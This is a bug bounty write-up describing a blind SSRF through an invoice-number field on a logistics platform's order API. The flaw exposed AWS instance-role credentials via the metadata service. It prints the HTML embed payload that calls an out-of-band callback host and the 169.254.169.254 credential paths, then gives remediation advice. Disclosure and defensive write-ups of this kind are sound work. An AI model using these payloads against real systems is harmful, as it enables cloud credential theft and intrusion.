# The Invoice Number That Read AWS

- **Source URL:** https://ritikver22000.medium.com/the-invoice-number-that-read-aws-fef6b987d5e4
- **Fetched from:** https://ritikver22000.medium.com/the-invoice-number-that-read-aws-fef6b987d5e4?source=rss-df987ff20ce8------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14914 (id 14914)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Xynos / Tue, 15 Sep 2026 20:17:31 GMT

One field on an order form was never meant to be interesting. It turned out to be the one field the server took literally — and the Ye was the reason it handed us its own cloud credentials.\*

SSRF · Bug bounty write-up · CWE-918 · CVSS 7.0

(Target identified by role, not name, while the finding is open. All keys and identifiers redacted.)

Every order API has fields that exist to be boring: an address line, a phone number, an invoice number. You fill them in, the server stores them, nobody thinks about them again. That is exactly why they make such good hiding places — the validation around a field that has never caused trouble tends to be a rubber stamp.

This is the story of “invoice\_number”: a text field on an order-creation endpoint of a logistics platform, and how typing a URL into it turned a routine order into a live AWS credential dump.

**## The setup**

The endpoint in question is a plain create-order call:

http

POST /api/v3/create-order?key=\[REDACTED\]&username=security-inhouse HTTP/2

Host: www.example-logistics.com

Content-Type: application/json

{

"consignee": "…",

"items": \[ /\* 19 KB of a perfectly normal order \*/ \],

"invoice\_number": "INV-2026–0041"

}

On the response side, the order comes back with a \`200 OK\` and a generated invoice record. The interesting question was never \*whether\* the field was accepted — it was \*\*what the backend does with it\*\*. An invoice number that the server treats as raw markup rather than an opaque string is not a label; it is an instruction.

\> \*\*Why this parameter was interesting:\*\* invoice values often end up processed server-side — parsed, templated, rendered into PDFs or embedded into downstream systems. Any pipeline that interprets your input as markup will also fetch the resources that markup references, from the server’s own network. That fetch is the entire attack surface. You don’t need a file upload or a “webhook URL” field to get SSRF; you need a server that trusts a string.

\## Step 1 — First, make the server dial out

Blind SSRF — where the server fetches a URL but never shows you the response — is proven the same way you’d prove a door opens in an empty room: leave something behind that tells you later. A Burp Collaborator endpoint does exactly that. So the invoice number became:

\`\`\`html

\<embed width="700" height="700" src=http://\[collab-id\].oastify.com>

\`\`\`

The value is an HTML \`\<embed>\` element whose \`src\` points at a server we control. If anything on the backend interprets that markup and resolves the \`src\`, our collaborator gets a hit — complete with the request’s source IP, so we’d learn which internal host did the fetching.

It did. The order went through with a \`200 OK\`, and minutes later the collaborator logged a callback from the platform’s internal infrastructure. That’s two confirmations in one:

1\. \*\*The field is processed, not stored.\*\* The server parsed the invoice number as markup — no sanitization between user input and whatever renders it.

2. \*\*The fetch happens from inside.\*\* The callback came from the backend’s network, which means the server makes outbound requests on our behalf — the definition of Server-Side Request Forgery.

But a callback only proves the forgery. The real question is what the server’s network position lets it reach.

**## Step 2 — Knocking on 169.254.169.254**

On AWS, every EC2 instance can reach a link-local address — \`169.254.169.254\` — that answers questions about itself: its instance ID, its region, its IAM roles. It is plumbing meant for the instance’s own use, reachable only from inside the instance. Which is precisely why it’s the crown jewel of any SSRF: the attacker doesn’t need to breach the network, only to convince the server to walk down its own hallway.

So the invoice number pointed at the metadata service instead. The backend’s fetcher walked it like a filesystem:

GET http://169.254.169.254/latest/meta-data/

├── ami-id

├── instance-type → "ec2" — confirmed: we're inside an EC2 instance

├── iam/

│ └── security-credentials/

│ └── ec2-instance → the instance's attached IAM role

└── identity-credentials/

└── ec2/

└── security-credentials/

└── ec2-instance → the credential document itself

Each level confirmed the last. The instance-type response said \`ec2\`; the IAM tree showed an attached role; the identity-credentials path returned the actual security-credentials document — the same JSON an in-instance SDK would receive:

```
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA[REDACTED]",
  "SecretAccessKey": "[REDACTED]",
  "Token": "[REDACTED]",
  "Expiration": "2026-01-21T11:00:00Z"
}
```
A live, temporary but fully functional set of AWS credentials — issued to the platform’s own production instance role, exfiltrated through an invoice field.

\> \*\*Values shown are reconstructed placeholders,\*\* not the real secret material — the actual keys were disclosed privately to the vendor and rotated as part of remediation. The shape of the response, though, is exactly what the service returns.

\## What those keys buy

Severity here was rated High (CVSS 7.0), and the number undersells it. A stolen instance-role credential is not a one-door key: whatever permissions the platform’s backend holds — object storage, queues, databases, internal APIs — now answer to the attacker too. And because the SSRF itself was repeatable and unauthenticated to any user who can create an order, the credential could be refreshed at will for as long as the role’s permissions stayed wide.

The attack chain required no exploit framework and no exotic 0-day. It needed one thing: \*\*a server that treated user input as instructions.\*\*

\## The fix, in order of importance

The report’s own remediation note says “sanitize user inputs” — true, but it’s the smallest piece. A fix that survives a security review stacks four layers:

\*\*1. Enforce IMDSv2.\*\* The single highest-value control. IMDSv2 requires a session token fetched via an HTTP \`PUT\` with a token header — requests that come through an SSRF payload can’t supply it by accident. Flip it to “required” at the account level and the entire metadata-harvest stage of this attack dies, even if the SSRF survives.

\*\*2. Validate the field as a string.\*\* An invoice number is \`\[A-Z0–9-\]{1,32}\` at most. Parsing user input as markup is the root cause; treat \`invoice\_number\` as an opaque identifier and reject anything that isn’t a plain invoice ID.

\*\*3. Allowlist outbound destinations.\*\* If the pipeline genuinely must fetch URLs, resolve them through a proxy that permits only known-good domains, and resolve DNS yourself — never let user-supplied hosts resolve to link-local (\`169.254.0.0/16\`), loopback, or RFC 1918 ranges.

\*\*4. Shrink the role.\*\* Least privilege limits the blast radius of every future SSRF, on this app or any other: a role that can only write to one S3 bucket is an annoyance to steal; a role that can read the account is a breach.

\## Takeaways

1\. \*\*Boring fields are where trust hides.\*\* Nobody fuzzes the invoice number — including, historically, the developers. Look at what the server \*does\* with a field, not just whether it validates.

2. \*\*One callback changes the finding’s whole shape.\*\* A blind hit upgrades “possible SSRF” to “confirmed SSRF” and tells you the source host. Always prove the fetch before you probe the internal network.

3. \*\*Metadata is a privilege boundary, not an endpoint.\*\* IMDS answers only inside the instance — which is exactly why any code that can be made to fetch URLs on the instance’s behalf is a credential oracle. IMDSv2 exists for precisely this attack.

4. \*\*Defense in depth isn’t optional here.\*\* Input validation, egress allowlisting, IMDSv2, least privilege — any one of the four would have blunted this. Two or more makes the chain unwritable.

— -

\*Written from an authorized engagement finding. The target is identified by role rather than name while the report remains open; the identity will be added once disclosure is complete. All credentials and tracking identifiers shown are redacted or reconstructed placeholders.\*

\*\*References:\*\* \[OWASP WSTG — SSRF\]([https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/19-Testing\_for\_Server\_Side\_Request\_Forgery](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server_Side_Request_Forgery)) · \[CWE-918\]([https://cwe.mitre.org/data/definitions/918.html](https://cwe.mitre.org/data/definitions/918.html)) · \[AWS IMDSv2 hardening guide\]([https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html))

\*\*Tags:\*\* #SSRF #AWSSecurity #BugBounty #WebSecurity #Pentesting
